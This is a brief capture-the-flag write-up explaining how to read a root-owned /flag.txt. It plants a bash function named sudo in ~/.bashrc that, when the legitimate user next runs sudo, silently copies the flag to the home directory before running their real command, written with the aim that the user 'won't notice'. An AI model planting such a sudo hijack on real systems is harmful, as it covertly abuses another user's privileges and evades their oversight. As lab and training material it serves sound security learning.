The expected way to solve this challenge once the flag file is
identified at /flag.txt, is to intercept the sudo command. Normally
this can be done by aliasing sudo, but that seems like it doesn't work
in this setup, so instead we can override sudo with a bash function of
the same name. This function will read /flag.txt out to a file in the
home dir, and then execute the legit user's expected command.

Put the following into ~/.bashrc:

sudo() {
    /usr/bin/sudo -S cat /flag.txt > flag.txt
    /usr/bin/sudo -S $@
}

The next time the legit user executes a command with sudo, the flag
that we're looking for should pop out, and they hopefully won't notice
that we were ever here!
